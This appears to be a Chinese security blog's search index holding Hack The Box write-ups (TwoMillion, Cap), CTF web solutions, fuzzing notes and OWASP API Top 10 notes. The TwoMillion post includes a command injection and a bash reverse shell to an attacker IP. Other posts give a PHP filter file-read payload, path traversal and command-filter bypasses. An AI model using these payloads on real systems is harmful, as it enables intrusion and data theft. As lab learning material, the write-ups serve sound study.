<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HTBNote2</title>
    <link href="/2024/12/04/HTBNote2/"/>
    <url>/2024/12/04/HTBNote2/</url>
    
    <content type="html"><![CDATA[<h2 id="TwoMillion"><a href="#TwoMillion" class="headerlink" title="TwoMillion"></a>TwoMillion</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><img src="/2024/12/04/HTBNote2/image-20241204104756180.png" alt="image-20241204104756180"></p><p>发现开放80端口，进一步扫描，显示did not follow redirect to <a href="http://2million.htb/">http://2million.htb/</a></p><blockquote><ol><li><p>nmap -sT 192.168.96.4  &#x2F;&#x2F;TCP连接扫描，不安全，慢</p></li><li><p>nmap -sS 192.168.96.4  &#x2F;&#x2F;SYN扫描,使用最频繁，安全，快</p></li><li><p>nmap -Pn 192.168.96.4  &#x2F;&#x2F;目标机禁用ping，绕过ping扫描</p></li><li><p>nmap -sU 192.168.96.4  &#x2F;&#x2F;UDP扫描,慢,可得到有价值的<a href="https://cloud.tencent.com/product/cvm/?from_column=20065&from=20065">服务器</a>程序</p></li><li><p>nmap -sI 僵尸ip 目标ip  &#x2F;&#x2F;使用僵尸机对目标机发送数据包</p></li><li><p>nmap -sA 192.168.96.4  &#x2F;&#x2F;检测哪些端口被屏蔽</p></li><li><p>nmap 192.168.96.4 -p <portnumber>  &#x2F;&#x2F;对指定端口扫描</portnumber></p></li><li><p>nmap 192.168.96.1&#x2F;24 &#x2F;&#x2F;对整个网段的主机进行扫描</p></li><li><p>nmap 192.168.96.4 -oX myscan.xml &#x2F;&#x2F;对扫描结果另存在myscan.xml</p></li><li><p>nmap -T1~6 192.168.96.4  &#x2F;&#x2F;设置扫描速度，一般T4足够。</p></li><li><p>nmap -sV 192.168.96.4  &#x2F;&#x2F;对端口上的服务程序版本进行扫描</p></li><li><p>nmap -O 192.168.96.4  &#x2F;&#x2F;对目标主机的操作系统进行扫描</p></li><li><p>nmap -sC <scirptfile> 192.168.96.4  &#x2F;&#x2F;使用脚本进行扫描，耗时长</scirptfile></p></li><li><p>nmap -A 192.168.96.4  &#x2F;&#x2F;强力扫描，耗时长</p></li><li><p>nmap -6 ipv6地址   &#x2F;&#x2F;对ipv6地址的主机进行扫描</p></li><li><p>nmap -f 192.168.96.4  &#x2F;&#x2F;使用小数据包发送，避免被识别出</p></li><li><p>nmap –mtu <size> 192.168.96.4 &#x2F;&#x2F;发送的包大小,最大传输单元必须是8的整数</size></p></li><li><p>nmap -D &lt;假ip&gt; 192.168.96.4 &#x2F;&#x2F;发送参杂着假ip的数据包检测</p></li><li><p>nmap –source-port <portnumber> &#x2F;&#x2F;针对防火墙只允许的源端口</portnumber></p></li><li><p>nmap –data-length: <length> 192.168.96.4 &#x2F;&#x2F;改变发生数据包的默认的长度，避免被识别出来是nmap发送的。</length></p></li><li><p>nmap -v 192.168.96.4  &#x2F;&#x2F;显示冗余信息(扫描细节)</p></li><li><p>nmap -sn 192.168.96.4  &#x2F;&#x2F;对目标进行ping检测，不进行端口扫描（会发送四种报文确定目标是否存活,）</p></li><li><p>nmap -sP 192.168.96.4  &#x2F;&#x2F;仅仅对目标进行ping检测。</p></li><li><p>nmap -n&#x2F;-p 192.168.96.4  &#x2F;&#x2F;-n表示不进行dns解析，-p表示要</p></li><li><p>nmap –system-dns 192.168.96.4  &#x2F;&#x2F;扫描指定系统的dns服务器</p></li><li><p>nmap –traceroute 192.168.96.4  &#x2F;&#x2F;追踪每个路由节点。</p></li><li><p>nmap -PE&#x2F;PP&#x2F;PM: 使用ICMP echo, timestamp, and netmask 请求包发现主机。</p></li><li><p>nmap -sP 192.168.96.4       &#x2F;&#x2F;主机存活性扫描，arp直连方式。</p></li><li><p>nmap -iR [number]       &#x2F;&#x2F;对随机生成number个地址进行扫描。</p></li></ol></blockquote><p>既然无法重定向，那就修改&#x2F;etc&#x2F;hosts，手动添加一条10.10.11.221到2million.htb的映射，添加好就能在浏览器进行访问了：</p><p><img src="/2024/12/04/HTBNote2/image-20241204105541273.png" alt="image-20241204105541273"></p><p>看到login，果断尝试，但login是需要邀请码的，所以来到邀请码相关界面</p><p><img src="/2024/12/04/HTBNote2/image-20241204105830650.png" alt="image-20241204105830650"></p><p>查看源码：</p><p><img src="/2024/12/04/HTBNote2/image-20241204110304898.png" alt="image-20241204110304898"></p><p>根据题目问题，查看inviteapi.min.js，发现是一段混淆过的代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">eval</span>((<span class="hljs-keyword">function</span>(<span class="hljs-params">p,a,c,k,e,d</span>)&#123;e=<span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>)&#123;<span class="hljs-keyword">return</span> c.<span class="hljs-title function_">toString</span>(<span class="hljs-number">36</span>)&#125;;<span class="hljs-keyword">if</span>(!<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^/</span>,<span class="hljs-title class_">String</span>))&#123;<span class="hljs-keyword">while</span>(c--)&#123;d[c.<span class="hljs-title function_">toString</span>(a)]=k[c]||c.<span class="hljs-title function_">toString</span>(a)&#125;k=[<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">return</span> d[e]&#125;];e=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">return</span><span class="hljs-string">&#x27;\\w+&#x27;</span>&#125;;c=<span class="hljs-number">1</span>&#125;;<span class="hljs-keyword">while</span>(c--)&#123;<span class="hljs-keyword">if</span>(k[c])&#123;p=p.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&#x27;\\b&#x27;</span>+<span class="hljs-title function_">e</span>(c)+<span class="hljs-string">&#x27;\\b&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>),k[c])&#125;&#125;<span class="hljs-keyword">return</span> p&#125;(<span class="hljs-string">&#x27;1 i(4)&#123;h 8=&#123;&quot;4&quot;:4&#125;;$.9(&#123;a:&quot;7&quot;,5:&quot;6&quot;,g:8,b:\&#x27;/d/e/n\&#x27;,c:1(0)&#123;3.2(0)&#125;,f:1(0)&#123;3.2(0)&#125;&#125;)&#125;1 j()&#123;$.9(&#123;a:&quot;7&quot;,5:&quot;6&quot;,b:\&#x27;/d/e/k/l/m\&#x27;,c:1(0)&#123;3.2(0)&#125;,f:1(0)&#123;3.2(0)&#125;&#125;)&#125;&#x27;</span>,<span class="hljs-number">24</span>,<span class="hljs-number">24</span>,<span class="hljs-string">&#x27;response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify&#x27;</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;|&#x27;</span>),<span class="hljs-number">0</span>,&#123;&#125;)))<br></code></pre></td></tr></table></figure><blockquote><p><code>eval()</code> 是 JavaScript 中的一个内置函数，用于将传入的字符串解析为代码并执行。这意味着，<code>eval</code> 可以动态执行在运行时构造的代码。</p></blockquote><p>那么可以把代码直接放进console中，将eval改成alert，即可看到原本的代码：</p><p><img src="/2024/12/04/HTBNote2/image-20241204113234341.png" alt="image-20241204113234341"></p><p><code>verifyInviteCode(code)</code>：发送邀请码到 <code>/api/v1/invite/verify</code>，验证有效性。</p><p><code>makeInviteCode()</code>：发送请求到 <code>/api/v1/invite/how/to/generate</code>，获取生成邀请码的提示信息。</p><p>那么使用控制台运行一下makeInviteCode试试：</p><p><img src="/2024/12/04/HTBNote2/image-20241204140247981.png" alt="image-20241204140247981"></p><p>数据被ROT13加密了，解密后得到</p><blockquote><p><img src="/2024/12/04/HTBNote2/image-20241204140850275.png" alt="image-20241204140850275"></p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">in</span> order to generate the invite code, make a post request to /api/v1/invite/generate<br></code></pre></td></tr></table></figure><p>那么使用curl命令发送post请求</p><p><img src="/2024/12/04/HTBNote2/image-20241204142019916.png" alt="image-20241204142019916"></p><p>解码得到邀请码</p><p><img src="/2024/12/04/HTBNote2/image-20241204142717080.png" alt="image-20241204142717080"></p><p>尝试注册</p><p><img src="/2024/12/04/HTBNote2/image-20241204142804130.png" alt="image-20241204142804130"></p><p><img src="/2024/12/04/HTBNote2/image-20241204143032717.png" alt="image-20241204143032717"></p><p>使用burp进行抓包，可以在点击access中的connection pack的时候抓包</p><p><img src="/2024/12/04/HTBNote2/image-20241204150736468.png" alt="image-20241204150736468"></p><p>结合提示得知，应该就是通过api调用完成提权</p><p>通过枚举，得到信息，admin下边有三个端点</p><p><img src="/2024/12/04/HTBNote2/image-20241204151519185.png" alt="image-20241204151519185"></p><p>&#x2F;api&#x2F;v1&#x2F;admin&#x2F;settings&#x2F;update是可以将普通用户升级管理员用户的，尝试升级：</p><p><img src="/2024/12/04/HTBNote2/image-20241204152454799.png" alt="image-20241204152454799"></p><p><img src="/2024/12/04/HTBNote2/image-20241204152751317.png" alt="image-20241204152751317"></p><p><img src="/2024/12/04/HTBNote2/image-20241204153221818.png" alt="image-20241204153221818"></p><p><img src="/2024/12/04/HTBNote2/image-20241204153316110.png" alt="image-20241204153316110"></p><p><img src="/2024/12/04/HTBNote2/image-20241204153342146.png" alt="image-20241204153342146"></p><p>升级成功，尝试为特定用户添加vpn</p><p><img src="/2024/12/04/HTBNote2/image-20241204153731041.png" alt="image-20241204153731041"></p><p><img src="/2024/12/04/HTBNote2/image-20241204153832925.png" alt="image-20241204153832925"></p><p><strong>由于username输入后，页面进行了vpn的生成，即运行了代码，那么可以尝试是否存在RCE（远程代码执行）</strong></p><p><img src="/2024/12/04/HTBNote2/image-20241204154655803.png" alt="image-20241204154655803"></p><p><strong>原理</strong>：注入分号（<code>;</code>）分隔符后跟系统命令，执行 <code>id</code>，检查是否执行了命令。</p><p>发现存在漏洞，那么就可以进行注入，利用bash反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1<br>或<br>bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&quot;</span><br><span class="hljs-comment"># bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1</span><br></code></pre></td></tr></table></figure><p><img src="/2024/12/04/HTBNote2/image-20241204165534853.png" alt="image-20241204165534853"></p><p><img src="/2024/12/04/HTBNote2/image-20241204165507192.png" alt="image-20241204165507192"></p><p><img src="/2024/12/04/HTBNote2/image-20241204170539526.png" alt="image-20241204170539526"></p><p>查看.env</p><p><img src="/2024/12/04/HTBNote2/image-20241204170609781.png" alt="image-20241204170609781"></p><p>通过ssh连接后，可以得到user.txt</p><p>开始提权：</p><p>查看当前用户信息：</p><p><img src="/2024/12/04/HTBNote2/image-20241206105712761.png" alt="image-20241206105712761"></p><p>查找用户和组信息：</p><p><img src="/2024/12/04/HTBNote2/image-20241206105622185.png" alt="image-20241206105622185"></p><p>这条命令的作用是 <strong>查找系统中所有属于 <code>admin</code> 组的文件</strong>，并且排除掉 <code>/sys</code> 和 <code>/proc</code> 目录中的结果。<code>/sys</code> 和 <code>/proc</code> 中的某些目录或文件需要更高的权限（如 root）才能访问。如果包含这些目录，可能会产生大量权限被拒绝的错误信息，且与常规文件管理无关。搜索时包括这些目录会导致结果冗杂，增加误导和干扰。</p><p>看到有个可疑文件&#x2F;var&#x2F;mail&#x2F;admin</p><p><img src="/2024/12/04/HTBNote2/image-20241206110251608.png" alt="image-20241206110251608"></p><p>根据文件提示去查看，发现是一个CVE：<a href="https://developer.aliyun.com/article/1337133">CVE-2023-0386</a></p><p>利用工具提权成功：</p><p><img src="/2024/12/04/HTBNote2/image-20241206112941031.png" alt="image-20241206112941031"></p><p><img src="/2024/12/04/HTBNote2/image-20241206113211172.png" alt="image-20241206113211172"></p><p><img src="/2024/12/04/HTBNote2/image-20241206113558509.png" alt="image-20241206113558509"></p><p>还可以sudo提权：</p><p><img src="/2024/12/04/HTBNote2/image-20241206105015639.png" alt="image-20241206105015639"></p><p><img src="/2024/12/04/HTBNote2/image-20241206112855159.png" alt="image-20241206112855159"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>interview1</title>
    <link href="/2024/12/03/interview1/"/>
    <url>/2024/12/03/interview1/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HTBNote1</title>
    <link href="/2024/12/02/HTBNote1/"/>
    <url>/2024/12/02/HTBNote1/</url>
    
    <content type="html"><![CDATA[<p>telnet</p><p>nmap</p><h1 id="Cap"><a href="#Cap" class="headerlink" title="Cap"></a>Cap</h1><p>Cap 是一台运行 HTTP 服务器的简单难度 Linux 靶机，该服务器执行管理功能，包括进行网络捕获。不当的权限控制导致了 <strong>不安全的直接对象引用（IDOR）</strong> 漏洞，从而允许访问其他用户的捕获数据。捕获的数据包含明文凭据，可以用来获取初始访问权限。随后，利用 Linux 的一个能力（Capability）实现权限提升至 root 用户。</p><p>问题1: How many TCP ports are open?</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sS -T5 <span class="hljs-number">10.10.10.245</span><br></code></pre></td></tr></table></figure><h4 id="sS（SYN-扫描）"><a href="#sS（SYN-扫描）" class="headerlink" title="-sS（SYN 扫描）"></a><code>-sS</code>（SYN 扫描）</h4><ul><li><strong>SYN 扫描</strong> 是 <code>nmap</code> 中的默认端口扫描技术之一，也被称为“半开扫描”。</li><li>工作原理：<ul><li>向目标发送一个 SYN 包（表示发起连接）。</li><li>如果目标端口开放，目标会返回一个 SYN&#x2F;ACK 包。</li><li>如果目标端口关闭，目标会返回一个 RST 包。</li><li>扫描不会完成三次握手（即不会发送 ACK 包），因此这种扫描相对隐蔽，不会在目标系统的服务中建立真正的连接。</li></ul></li></ul><h4 id="T5-（时间模板）"><a href="#T5-（时间模板）" class="headerlink" title="**-T5**（时间模板）"></a>**<code>-T5</code>**（时间模板）</h4><ul><li><code>-T5</code> 设置 <code>nmap</code> 的 <strong>时间模板</strong> 为 “最快模式”（<code>Insane</code>）。</li><li>时间模板范围从 -T0（最慢）到 -T5（最快）：<ul><li><strong><code>-T0</code>（Paranoid）</strong>：逐步扫描，非常适合躲避防火墙。</li><li><strong><code>-T1</code>（Sneaky）</strong>：慢速扫描，用于躲避IDS&#x2F;IPS。</li><li><strong><code>-T2</code>（Polite）</strong>：降低扫描对目标网络的影响。</li><li><strong><code>-T3</code>（Normal）</strong>：默认速度，平衡性能和隐蔽性。</li><li><strong><code>-T4</code>（Aggressive）</strong>：更快，但可能引起注意。</li><li><strong><code>-T5</code>（Insane）</strong>：最快模式，适合高带宽的稳定网络，但容易被目标防火墙发现。</li></ul></li></ul><p><img src="/2024/12/02/HTBNote1/image-20241202164105257.png" alt="image-20241202164105257"></p><p>问题2: After running a “Security Snapshot”, the browser is redirected to a path of the format <code>/[something]/[id]</code>, where <code>[id]</code> represents the id number of the scan. What is the <code>[something]</code>?</p><p>在运行“安全快照”后，浏览器会被重定向到路径格式为 &#x2F;[something]&#x2F;[id]，其中 [id] 表示扫描的 ID 编号。那么 [something] 是什么？</p><p>首先，根据80端口正在运行可以选择直接访问10.10.10.245查看页面，点开左边状态栏后可以找到security snapshot</p><p><img src="/2024/12/02/HTBNote1/image-20241202170045136.png" alt="image-20241202170045136"></p><p>页面像是流量管理类似的页面，根据名称可以推测应该是数据缓存，可以下载，此时尝试遍历&#x2F;data&#x2F;x</p><p>发现在&#x2F;data&#x2F;0下存在不同的文件，下载下来发现是pcap包</p><p><img src="/2024/12/02/HTBNote1/image-20241203091637206.png" alt="image-20241203091637206"></p><p>放进wireshark中查看，发现存在账户信息明文</p><p><img src="/2024/12/02/HTBNote1/image-20241203092654887.png" alt="image-20241203092654887"></p><p>得到信息后可以使用ssh进行连接（因为根据扫描知道ssh端口是活动的）</p><p><img src="/2024/12/02/HTBNote1/image-20241203100633508.png" alt="image-20241203100633508"></p><p>可以看到有个user.txt文件，查看得到普通用户flag</p><p>接下来尝试<a href="https://hackerqwq.github.io/2021/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87%E4%BA%8C-Linux%E6%8F%90%E6%9D%83/">提权</a>：</p><p>sudo提权，发现当前用户无法使用：</p><p><img src="/2024/12/02/HTBNote1/image-20241203102116875.png" alt="image-20241203102116875"></p><p>尝试利用suid提权</p><p>但发现没有可利用的命令</p><p><img src="/2024/12/02/HTBNote1/image-20241203135343953.png" alt="image-20241203135343953"></p><p>（其实有，pkexec，但还没学会怎么利用，<a href="https://github.com/berdav/CVE-2021-4034/blob/main/pwnkit.c">原理以及对应工具</a>）</p><p>使用linPEAS工具查看可能存在的漏洞</p><p>发现</p><p><img src="/2024/12/02/HTBNote1/image-20241203141547303.png" alt="image-20241203141547303"></p><p><a href="https://www.cnblogs.com/f-carey/p/16026088.html">cap提权</a></p><p>运行SUID的命令时，通常只是需要使用一小部分特权，但是使用SUID，却可以拥有root用户的全部权限。所以，一旦SUID的文件存在漏洞，便可能被利用，以root身份执行其他操作。</p><p>SUID的问题，主要在于权限控制太粗糙。为了对root身份进行更加精细的控制，Linux增加了另一种机制，即capabilities。</p><p>（所以靶机名字叫cap）</p><p>从图中可以看到</p><p>构造python脚本，获取到root权限</p><p><img src="/2024/12/02/HTBNote1/image-20241203141738568.png" alt="image-20241203141738568"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>WebFuzzNote1</title>
    <link href="/2024/08/30/WebFuzzNote1/"/>
    <url>/2024/08/30/WebFuzzNote1/</url>
    
    <content type="html"><![CDATA[<h3 id="Fuzz过程"><a href="#Fuzz过程" class="headerlink" title="Fuzz过程"></a>Fuzz过程</h3><p><img src="/2024/08/30/WebFuzzNote1/image-20240924103535708.png" alt="image-20240924103535708"></p><ol><li>识别目标：选择目标应用程序，看看存在什么样的漏洞</li><li>识别输入：识别程序输入向量，包括头部，环境变量等</li><li>生成测试数据：根据目标选择合适的方法插入模糊变量，生成数据</li><li>执行模糊数据：将数据包发送到目标应用程序，打开文件或启动目标进程，这个过程应该是自动化的</li><li>监测异常：记录异常或故障测试</li><li>确定可用性：确定是否可以进一步使用检测到的异常或故障</li></ol><h3 id="Fuzzer"><a href="#Fuzzer" class="headerlink" title="Fuzzer"></a>Fuzzer</h3><p>基于变异&#x2F;基于生成</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WebWriteUp10</title>
    <link href="/2024/08/10/WebWriteUp10/"/>
    <url>/2024/08/10/WebWriteUp10/</url>
    
    <content type="html"><![CDATA[<h3 id="afr-1"><a href="#afr-1" class="headerlink" title="afr_1"></a>afr_1</h3><p><img src="/2024/08/10/WebWriteUp10/image-20240810150911255.png" alt="image-20240810150911255"></p><p>靶场进来只有这个，根据题目任意文件读取漏洞</p><p>尝试使用php伪协议</p><p>构造payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?p=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag<br></code></pre></td></tr></table></figure><p>得到：</p><p><img src="/2024/08/10/WebWriteUp10/image-20240810151320543.png" alt="image-20240810151320543"></p><p><img src="/2024/08/10/WebWriteUp10/image-20240810151307608.png" alt="image-20240810151307608"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no no no&#x27;</span>);<br><span class="hljs-comment">//n1book&#123;afr_1_solved&#125;</span><br></code></pre></td></tr></table></figure><p>得到flag</p><h3 id="afr-2"><a href="#afr-2" class="headerlink" title="afr_2"></a>afr_2</h3><p><img src="/2024/08/10/WebWriteUp10/image-20240810151541427.png" alt="image-20240810151541427"></p><p>进来欣赏老一辈艺术家</p><p>查看源码</p><p><img src="/2024/08/10/WebWriteUp10/image-20240810151657145.png" alt="image-20240810151657145"></p><p>看到存在目录，尝试访问：</p><p><img src="/2024/08/10/WebWriteUp10/image-20240810151734561.png" alt="image-20240810151734561"></p><p>可以成功访问，那么直接目录穿越</p><p>尝试到&#x2F;img..&#x2F;时到达根目录</p><p><img src="/2024/08/10/WebWriteUp10/image-20240810152126888.png" alt="image-20240810152126888"></p><p>下载得到flag</p><h3 id="朴实无华"><a href="#朴实无华" class="headerlink" title="朴实无华"></a>朴实无华</h3><p><img src="/2024/08/10/WebWriteUp10/image-20240901144003097.png" alt="image-20240901144003097"></p><p>进来说无法修改头信息，那大概率hint就在头里，但抓包，伪协议等均不好使</p><p>直接暴力扫目录</p><p><img src="/2024/08/10/WebWriteUp10/image-20240901144143873.png" alt="image-20240901144143873"></p><p>可以看到有个robots.txt</p><p>访问后得到：</p><p><img src="/2024/08/10/WebWriteUp10/image-20240901151423651.png" alt="image-20240901151423651"></p><p>再访问，得到：</p><p><img src="/2024/08/10/WebWriteUp10/image-20240901152113643.png" alt="image-20240901152113643"></p><blockquote><p>在 <code>robots.txt</code> 文件中，<code>Disallow</code> 是一个属性，用于指定哪些URL路径不允许搜索引擎的爬虫（robots）访问。<code>robots.txt</code> 文件是用来指导搜索引擎爬虫如何抓取网站的标准文件。</p></blockquote><p>但能在相应头中找到提示look at me：</p><p><img src="/2024/08/10/WebWriteUp10/image-20240901152651412.png" alt="image-20240901152651412"></p><p>访问&#x2F;fl4g.php，进入代码审计环节</p><p><img src="/2024/08/10/WebWriteUp10/image-20240901153140953.png" alt="image-20240901153140953"></p><p>总结：</p><ul><li>level 1检查参数num，并且值要小于2020，但+1后要大于2021</li><li>level 2检查参数md5，其自身等于本身的md5值</li><li>level 3检查参数get_flag，其值不能包含空格，并且不能使用cat命令，最后会执行get_flag作为系统命令</li></ul><p>首先level 1的绕过，抓包查看后得到php版本为5</p><p><img src="/2024/08/10/WebWriteUp10/image-20240901160333536.png" alt="image-20240901160333536"></p><p>那么在php5中，intval函数的对于科学计数法e的解析会当作普通字符（在高版本中无法利用</p><p>即：intval(‘1e5’)只会被解析成int(1)，但在函数内进行加法运算时，e又可以被正常解析。通过此方法，即可进行绕过</p><p>构造第一段payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">num</span>=1e5<br></code></pre></td></tr></table></figure><p>验证：</p><p><img src="/2024/08/10/WebWriteUp10/image-20240901160654738.png" alt="image-20240901160654738"></p><p>成功输出</p><p>对于level 2，需要利用到php中的hash缺陷，即0e+纯数字的组合在php中会被认定为是科学计数法，由于0的多少次方都是0，所以可以利用并实现绕过</p><p>构造第二段paylaod：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">md5</span>=0e215962017<br></code></pre></td></tr></table></figure><p>验证：</p><p><img src="/2024/08/10/WebWriteUp10/image-20240901171123586.png" alt="image-20240901171123586"></p><p>对于level 3的绕过，即一个较为简单的命令注入，可以先ls看看有什么文件</p><p><img src="/2024/08/10/WebWriteUp10/image-20240901171135834.png" alt="image-20240901171135834"></p><p>对于cat的绕过：ca\t，还可以使用tail，nl等命令</p><p>对于空格的绕过：${IFS}</p><p><img src="/2024/08/10/WebWriteUp10/image-20240901171402157.png" alt="image-20240901171402157"></p><p>得到flag</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OWASPTop10</title>
    <link href="/2024/05/21/OWASPTop10/"/>
    <url>/2024/05/21/OWASPTop10/</url>
    
    <content type="html"><![CDATA[<h1 id="OWASP-Top-10"><a href="#OWASP-Top-10" class="headerlink" title="OWASP Top 10"></a>OWASP Top 10</h1><h2 id="Broken-Object-Level-Authorization"><a href="#Broken-Object-Level-Authorization" class="headerlink" title="Broken Object Level Authorization"></a>Broken Object Level Authorization</h2><p>对象级别授权机制的缺陷</p><p>应用程序在用户请求访问某个对象时没有正确验证用户的权限，从而导致未经授权的用户可以访问、修改甚至删除不属于他们的资源</p><p>例子：</p><ul><li>场景：应用通过唯一id来存储用户信息，用户用过例如User&#x2F;{UserID} 的形式访问自己的账户</li><li>正常流程：用户使用例如 Get 张三&#x2F;12345来访问自己的账户，应用进行身份审核确认用户身份和权限，通过后返回账户信息</li><li>漏洞利用：应用的身份权限审核并不严格，导致用户可以访问别人的账户，并执行恶意操作</li></ul><h2 id="Broken-Authentication"><a href="#Broken-Authentication" class="headerlink" title="Broken Authentication"></a>Broken Authentication</h2><p>应用程序的身份验证机制设计不当或实现不正确，导致攻击者能够绕过身份验证机制，从而获得未经授权的访问权限</p><p><strong>产生原因：</strong></p><p><strong>弱密码策略</strong>：</p><ul><li>应用程序允许用户使用弱密码（如“123456”或“password”），或没有强制使用复杂密码的策略。</li><li>缺乏对多次登录失败的限制，使得攻击者可以通过暴力破解来猜测密码。</li></ul><p><strong>凭证泄露</strong>：</p><ul><li>未加密的凭证存储或传输，使得攻击者能够窃取登录信息。</li><li>会话ID或其他身份验证令牌在传输过程中未加密，容易被中间人攻击（Man-in-the-Middle）窃取。</li></ul><p><strong>不安全的会话管理</strong>：</p><ul><li>会话ID生成不够随机，容易被猜测。</li><li>会话ID在用户注销后没有被销毁，使得攻击者可以利用旧的会话ID重新登录。</li><li>会话在用户一段时间不活动后没有自动过期。</li></ul><p><strong>未正确实现的多因素认证（MFA）</strong>：</p><ul><li>实现不当的多因素认证，可能允许攻击者绕过此安全措施。</li><li>有些系统在多因素认证中存在漏洞，如使用不安全的第二因素（例如容易猜测的安全问题）。</li></ul><p><strong>不安全的重置密码机制</strong>：</p><ul><li>密码重置功能设计不当，例如通过电子邮件或短信发送不安全的重置链接或令牌。</li></ul><h2 id="Broken-Object-Property-Level-Authorization"><a href="#Broken-Object-Property-Level-Authorization" class="headerlink" title="Broken Object Property Level Authorization"></a>Broken Object Property Level Authorization</h2><p>在许多应用程序中，特别是那些使用API与客户端通信的应用程序，对象通常是包含多个属性的复杂数据结构。例如，一个用户对象可能包含 <code>username</code>、<code>email</code>、<code>password</code>、<code>role</code> 等属性。在对象级别授权机制中，应用程序可能正确地验证了用户是否可以访问某个对象，但没有细致地验证用户是否可以访问或修改对象的每个属性。</p><p>BOPLA 漏洞通常发生在以下情况下：</p><ol><li><strong>不完整的授权验证</strong>：<ul><li>应用程序只检查用户是否有权访问整个对象，但没有进一步检查用户对对象内特定属性的权限。</li><li>例如，普通用户能够访问自己的 <code>profile</code> 对象，但应用程序未正确验证用户对 <code>role</code> 属性的访问权限，导致用户可以修改自己或他人的权限级别。</li></ul></li><li><strong>API 设计缺陷</strong>：<ul><li>在使用RESTful API或GraphQL等技术时，开发者可能允许客户端请求或修改</li></ul></li></ol><h2 id="Unrestricted-Resource-Consumption"><a href="#Unrestricted-Resource-Consumption" class="headerlink" title="Unrestricted Resource Consumption"></a>Unrestricted Resource Consumption</h2><p>无限制的资源消耗是指在软件系统、应用程序或服务中，资源使用缺乏适当限制或控制，导致某些用户或进程能够不受限制地消耗大量系统资源（如CPU、内存、带宽、磁盘空间等）。这种情况可能引发性能下降、系统崩溃、拒绝服务（DoS）攻击，甚至使系统完全无法响应。</p><h3 id="Unrestricted-Resource-Consumption-的典型表现"><a href="#Unrestricted-Resource-Consumption-的典型表现" class="headerlink" title="Unrestricted Resource Consumption 的典型表现"></a>Unrestricted Resource Consumption 的典型表现</h3><ol><li><strong>CPU消耗</strong>：<ul><li>用户或进程能够在没有限制的情况下进行复杂或无限循环的计算任务，导致CPU被耗尽。攻击者可以利用这一点发起CPU饱和攻击，迫使服务器无法处理其他请求。</li></ul></li><li><strong>内存消耗</strong>：<ul><li>没有正确管理或限制的内存分配可能会导致应用程序消耗大量内存，触发内存泄漏、内存耗尽，最终导致系统崩溃或性能严重下降。</li></ul></li><li><strong>带宽消耗</strong>：<ul><li>在网络应用中，用户或恶意程序可以通过大量的数据请求或文件上传&#x2F;下载，占用大部分的网络带宽，导致其他用户的网络访问变慢或完全中断。</li></ul></li><li><strong>磁盘空间消耗</strong>：<ul><li>用户能够不受限制地上传文件、生成日志或创建数据，这可能导致服务器的磁盘空间被迅速耗尽，使得应用程序无法正常运行。</li></ul></li><li><strong>线程或进程消耗</strong>：<ul><li>应用程序允许用户创建大量线程或进程，导致系统资源被耗尽，可能引发线程或进程饥饿，甚至导致系统无法处理新的请求。</li></ul></li></ol><h3 id="Unrestricted-Resource-Consumption-的成因"><a href="#Unrestricted-Resource-Consumption-的成因" class="headerlink" title="Unrestricted Resource Consumption 的成因"></a>Unrestricted Resource Consumption 